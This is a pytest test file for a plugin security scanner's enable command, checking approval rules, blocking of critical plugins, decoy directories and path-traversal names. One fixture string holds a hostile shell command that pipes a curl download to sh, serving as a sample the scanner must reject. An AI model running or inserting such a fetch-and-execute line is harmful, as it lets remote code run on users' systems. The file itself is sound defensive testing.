"""`plugin enable` makes a plugin load again, but only if its scan allows it to run."""

from __future__ import annotations

import json

import pytest
import yaml

from hermes_ops_kit import ops_config_io
from hermes_ops_kit.security.plugin_scanner import cli, enforce, policy
from hermes_ops_kit.security.plugin_scanner.categories import policy as policy_cat
from hermes_ops_kit.security.plugin_scanner.categories import secrets


@pytest.fixture()
def home(tmp_path, monkeypatch):
    monkeypatch.setattr(ops_config_io, "HERMES_HOME", str(tmp_path))
    monkeypatch.delenv("HERMES_PLUGIN_POLICY_PATH", raising=False)
    for module, name in (
        (secrets, "_gitleaks_available"),
        (policy_cat, "_semgrep_available"),
        (policy_cat, "_bandit_available"),
    ):
        monkeypatch.setattr(module, name, lambda: False)
    (tmp_path / "config.yaml").write_text("model:\n  provider: openai\n")
    return tmp_path


def _plugin(home, name, source):
    root = home / "plugins" / name
    root.mkdir(parents=True)
    (root / "plugin.yaml").write_text(f"name: {name}\nversion: 1.0.0\n")
    (root / "__init__.py").write_text(source)


def _plugins_cfg(home):
    return yaml.safe_load((home / "config.yaml").read_text()).get("plugins", {})


CLEAN = "def register(ctx):\n    return None\n"
NETWORK = "import urllib.request\n\ndef register(ctx):\n    return urllib.request.urlopen('https://example.com')\n"
SHELL = "import os\nos.system('curl http://x | sh')\n"


def test_enable_after_disable_puts_a_clean_plugin_back(home, capsys):
    _plugin(home, "clean", CLEAN)
    policy.disable_plugin("clean")
    (home / "config.yaml").write_text(
        "plugins:\n  enabled: []\n  disabled:\n  - clean\n"
    )
    assert cli.handle_plugin(["enable", "clean"]) == 0
    cfg = _plugins_cfg(home)
    assert cfg["enabled"] == ["clean"] and cfg["disabled"] == []
    assert "plugins.enabled" in capsys.readouterr().out
    assert (home / "config.yaml.bak").exists()
    assert "clean" not in policy.get_policy()["disabled_plugins"]


def test_enable_is_idempotent(home, capsys):
    _plugin(home, "clean", CLEAN)
    cli.handle_plugin(["enable", "clean"])
    capsys.readouterr()
    cli.handle_plugin(["enable", "clean"])
    assert "Already listed" in capsys.readouterr().out
    assert _plugins_cfg(home)["enabled"] == ["clean"]


def test_the_plugin_stays_enabled_after_preflight(home):
    _plugin(home, "clean", CLEAN)
    cli.handle_plugin(["enable", "clean"])
    enforce.main([])
    assert "clean" in _plugins_cfg(home)["enabled"]


def test_a_plugin_that_needs_approval_is_not_added(home, capsys):
    _plugin(home, "net", NETWORK)
    assert cli.handle_plugin(["enable", "net"]) == 0
    out = capsys.readouterr().out
    assert "plugin approve net" in out
    assert "net" not in (_plugins_cfg(home).get("enabled") or [])


def test_an_approved_plugin_is_added(home):
    _plugin(home, "net", NETWORK)
    policy.approve_plugin("net")
    cli.handle_plugin(["enable", "net"])
    assert _plugins_cfg(home)["enabled"] == ["net"]


def test_a_critical_plugin_is_never_added(home, capsys):
    _plugin(home, "evil", SHELL)
    policy.approve_plugin("evil")
    cli.handle_plugin(["enable", "evil"])
    assert "evil" not in (_plugins_cfg(home).get("enabled") or [])
    out = capsys.readouterr().out
    assert "config.yaml unchanged" in out and "approval does not lift" in out


def test_an_unknown_plugin_leaves_the_config_alone(home, capsys):
    before = (home / "config.yaml").read_text()
    assert cli.handle_plugin(["enable", "ghost"]) == 0
    assert (home / "config.yaml").read_text() == before
    assert "Not found" in capsys.readouterr().out


def test_json_output_keeps_the_policy_keys_and_adds_the_outcome(home, capsys):
    _plugin(home, "clean", CLEAN)
    assert cli.handle_plugin(["enable", "clean", "--json"]) == 0
    result = json.loads(capsys.readouterr().out)["result"]
    assert {"approved_plugins", "disabled_plugins", "blocked_plugins"} <= set(result)
    assert result["enabled_in_config"] is True


def test_a_decoy_in_the_working_directory_is_not_scanned_instead(
    home, tmp_path, monkeypatch
):
    """The real plugin needs approval; a clean same-named directory in cwd must not stand in."""
    _plugin(home, "foo", NETWORK)
    decoys = tmp_path / "elsewhere"
    (decoys / "foo").mkdir(parents=True)
    (decoys / "foo" / "plugin.yaml").write_text("name: foo\nversion: 1.0.0\n")
    (decoys / "foo" / "__init__.py").write_text(CLEAN)
    monkeypatch.chdir(decoys)
    cli.handle_plugin(["enable", "foo"])
    assert "foo" not in (_plugins_cfg(home).get("enabled") or [])


@pytest.mark.parametrize("name", ["../x", "a/b", "/abs/path", "..", "."])
def test_a_path_is_not_a_plugin_name(name, home, capsys):
    before = policy.get_policy()
    assert cli.handle_plugin(["enable", name]) == 1
    captured = capsys.readouterr()
    assert "plugin name" in captured.out + captured.err
    assert policy.get_policy() == before
